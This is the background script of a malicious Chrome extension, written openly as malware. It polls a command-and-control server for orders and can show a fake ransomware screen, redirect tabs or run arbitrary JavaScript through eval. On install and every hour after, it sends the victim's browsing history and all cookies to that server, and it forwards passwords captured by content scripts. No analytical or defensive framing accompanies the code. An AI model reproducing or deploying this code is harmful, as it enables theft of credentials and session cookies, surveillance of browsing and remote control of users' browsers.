// ============================================================
// BACKGROUND SERVICE WORKER
// Runs silently in the background at all times
// ============================================================

// C2 Server address - CHANGE THIS to your server IP
const C2_SERVER = "http://127.0.0.1:8080";
const POLL_INTERVAL_SECONDS = 5; // Check for commands every 5 seconds

// ---- ALARM: Poll for C2 commands periodically ----
chrome.alarms.create("c2_poll", { periodInMinutes: 0.1 }); // every ~6 seconds

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "c2_poll") {
    pollForCommands();
  }
});

// ---- Poll the C2 server for commands ----
async function pollForCommands() {
  try {
    const res = await fetch(`${C2_SERVER}/c2/poll/`, { credentials: "include" });
    const data = await res.json();

    if (data.command) {
      executeC2Command(data.command, data.payload);
    }
  } catch (e) {
    // Silently fail — server might be offline
  }
}

// ---- Execute command received from C2 ----
async function executeC2Command(command, payload) {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab) return;

  if (command === "RANSOMWARE") {
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: () => {
        const overlay = document.createElement("div");
        overlay.style = `
          position:fixed; top:0; left:0; width:100%; height:100%; 
          background:#8b0000; z-index:2147483647; display:flex;
          flex-direction:column; align-items:center; justify-content:center;
          font-family: monospace; color: white; text-align:center;
        `;
        overlay.innerHTML = `
          <h1 style="font-size:4rem; text-shadow:0 0 20px red; animation: blink 0.5s infinite;">⚠️ SYSTEM COMPROMISED ⚠️</h1>
          <p style="font-size:1.5rem; margin-top:20px;">All your files have been encrypted.</p>
          <p style="font-size:1rem; color:#ffaaaa; margin-top:10px;">Contact: ransom@darkweb.onion for decryption key.</p>
          <style>@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }</style>
        `;
        document.body.appendChild(overlay);
        document.documentElement.requestFullscreen().catch(() => {});
      }
    });
  }
  else if (command === "REDIRECT") {
    chrome.tabs.update(tab.id, { url: payload });
  }
  else if (command === "EVAL_JS") {
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: (code) => { try { eval(code); } catch(e) {} },
      args: [payload]
    });
  }
}

// ---- Collect browser history and send to C2 ----
async function exfilHistory() {
  try {
    const history = await chrome.history.search({ text: "", maxResults: 50, startTime: Date.now() - 7 * 24 * 60 * 60 * 1000 });
    const urls = history.map(h => h.url).join("\n");

    await fetch(`${C2_SERVER}/exfil/history/`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ history: urls, source: "extension" })
    });
  } catch (e) {}
}

// ---- Collect all cookies and send to C2 ----
async function exfilCookies() {
  try {
    const cookies = await chrome.cookies.getAll({});
    const cookieData = cookies.map(c => `${c.domain} | ${c.name}=${c.value}`).join("\n");

    await fetch(`${C2_SERVER}/exfil/cookies/`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookies: cookieData, source: "extension" })
    });
  } catch (e) {}
}

// Run exfil on install and then every hour
chrome.runtime.onInstalled.addListener(() => {
  exfilHistory();
  exfilCookies();
});

chrome.alarms.create("hourly_exfil", { periodInMinutes: 60 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "hourly_exfil") {
    exfilHistory();
    exfilCookies();
  }
});

// ---- Listen for messages from content scripts ----
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === "CREDENTIAL_CAPTURED") {
    // Send stolen credentials to C2
    fetch(`${C2_SERVER}/`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: msg.username,
        password: msg.password,
        source_url: msg.url,
        local_storage: msg.localStorage,
        history: "via-extension",
        webcam_snap: null
      })
    }).catch(() => {});
  }
});
